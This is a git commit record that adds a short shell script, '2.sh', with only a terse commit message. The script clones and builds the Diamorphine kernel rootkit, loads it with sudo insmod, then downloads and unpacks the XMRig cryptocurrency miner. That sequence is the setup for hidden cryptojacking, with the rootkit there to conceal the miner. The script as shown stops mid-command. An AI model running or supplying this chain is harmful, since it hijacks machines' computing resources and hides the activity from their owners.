5d5308d5cad1b2021816c8d4b82278c8fd7175e6
Luca Zani <68642373+OverloadedTech@users.noreply.github.com>
2024-06-30 22:07:49 +0200

    like what is after n1

---
+++ 2.sh
@@ -0,0 +1,6 @@
+git clone https://github.com/m0nad/Diamorphine
+cd Diamorphine && 
+sudo make && 
+sudo insmod diamorphine.ko && 
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-noble-x64.tar.gz &&
+tar -xf xmrig-6.21.3-noble-x64.tar.gz && 
